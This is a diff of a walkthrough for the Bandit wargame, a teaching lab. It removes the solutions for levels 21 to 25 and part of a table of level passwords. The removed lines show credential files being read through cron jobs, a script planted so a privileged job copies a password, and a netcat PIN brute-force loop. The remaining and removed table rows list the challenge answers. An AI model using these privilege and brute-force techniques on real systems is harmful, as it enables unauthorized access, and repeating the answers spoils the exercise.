@@ -541,119 +541,6 @@ gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 *Running Parellel Tasks*  
 ./suconnect is a setuid binary that runs the program on the port mentioned, and we need to open a parellel window along with it (tmux helps, but i did'nt use it). On the other window, we listen to the server running, which when I send the current password returns the next.
 ___
-# Level 21 -> 22
-~~~
-bandit21@bandit:~$ cd /etc/cron.d/
-bandit21@bandit:/etc/cron.d$ ls
-atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
-bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
-@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
-* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
-bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
-#!/bin/bash
-chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
-~~~
-*cron processes*  
-Cron’s format is a little unorthodox so let’s take a look. there are 5 spaces for specifying what time to run the script or program. If the space isn’t needed a star is used as a placeholder. The first position is used to denote , the minute using a value between 0-59. The second one is hour, using the 24 hour clock, meaning values between 0-23. The third place is used for day of the month,  using values ranging from 1-31. The fourth space is month, specified by numbers between 1-12. The fifth position is used for day of the week, depending on the distribution 0 or 7 could be Sunday, I recommend checking on any distribution that you’re not sure about. The next part of a cron job is the username that executes the job. The final part of the cron job command is the script or program that is to be executed.
-
-~~~
-*     *    *    *     *        command to be executed
-–     –    –    –    –
-|     |     |     |    |
-|     |     |     |    +—– day of week (0 – 6) (Sunday=0)
-|     |     |     +——- month (1 – 12)
-|     |     +——— day of        month (1 – 31)
-|     +———– hour (0 – 23)
-+————- min (0 – 59)
-~~~
-NOTE: Here the process is repeating every minute, and that is reboot '/usr/bin/cronjob_bandit22.sh' shell file which changes the permission and copies the passowrd in the /tmp/ file.
-___
-# Level 22 -> 23
-~~~
-bandit22@bandit:/etc/cron.d$ ls
-atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
-bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
-@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
-* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
-bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash
-
-myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
-
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
-bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
-8ca319486bfbbc3663ea0fbe81326349
-bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
-~~~
-*Hashing function and delimeter*
-Here the output of 'I am user $myname' was hashed using md5 and the first worf of the file was taken (' ' was the delimeter/seperation).  
-But we using whoami we used to get bandit22, and we have the password for that. So we just tried out luck to understand the bash file and do the same of 'bandit23' and luckily it worked!
-___
-# Level 23 -> 24
-~~~
-bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
-@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
-#!/bin/bash
-myname=$(whoami)
-cd /var/spool/$myname
-echo "Executing and deleting all scripts in /var/spool/$myname:"
-for i in * .*;
-do
-    if [ "$i" != "." -a "$i" != ".." ];
-    then
-        echo "Handling $i"
-        timeout -s 9 60 ./$i
-        rm -f ./$i
-    fi
-done
-
-bandit23@bandit:~$ mkdir -p /tmp/gxuvimr
-bandit23@bandit:~$ cd /tmp/gxuvimr
-bandit23@bandit:/tmp/gxuvimr$ touch pass.sh
-bandit23@bandit:/tmp/gxuvimr$ chmod 777 pass.sh
-bandit23@bandit:/tmp/gxuvimr$ vim pass.sh
-
-
-#!/bin/bash
-cat /etc/bandit_pass/bandit24 > /tmp/gxuvimr/pass
-
-
-bandit23@bandit:/tmp/gxuvimr$ cat pass
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-~~~
-*Writing the script*  
-Here we basically wrote a script, as each file was excecuting before getting deleted. We copied a script so that the password gets copied to our folder in /tmp/.
-___
-# Level 24 -> 25
-~~~
-#!/bin/bash
-pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-
-for i in {0000..9999}
-do
-	echo $i >> out.txt
-	echo $pass $i | nc localhost 30002 >> out.txt &
-	pid=$!
-	sleep 1
-	kill $pid
-	echo "" >> out.txt
-done
-__
-Correct!
-The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-~~~
-*BruteForcing and finding PID of a process*  
-Basically created a bash script to take each number and check for the password i.e. a for loop. '$!' gives the PID of the process and is killing it after excecution (after a sleep of 1 sec). The meaning of 'kill $pid' is a replacement of 'Ctrl + C' in the bash script.
-___
 # Usernames and Passwords
 
 | Username  | Password |
@@ -668,7 +555,7 @@ bandit6	  |  DXjZPULLxYr17uwoI01bNLQbtFemEgo7
 bandit7	  |  HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
 bandit8	  |  cvX2JJa4CFALtqS87jk27qwqGhBM9plV
 bandit9	  |  UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
-bandit10  |	 truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+bandit10  |  truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
 bandit11  |  IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
 bandit12  |	 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
 bandit13  |	 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
@@ -679,17 +566,3 @@ bandit17  |	 xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
 bandit18  |	 kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 bandit19  |	 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 bandit20  |	 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
-bandit21  |  gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
-bandit22  |	 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
-bandit23  |  jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
-bandit24  |  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-bandit25  |  uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-bandit26  |  5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
-bandit27  |  3ba3118a22e93127a4ed485be72ef5ea
-bandit28  |  0ef186ac70e04ea33b4c1853d2526fa2
-bandit29  |  bbc96594b4e001778eee9975372716b2
-bandit30  |  5b90576bedb2cc04c86a9e924ce42faf
-bandit31  |  47e603bb428404d265f59c42920d81e5
-bandit32  |  56a9bf19c63d650ce78e6ec0354ee45e
-bandit33  |  c9c3199ddf4121b10cf581a98d51caee
-bandit34  |  CHALLENGE COMPLETED
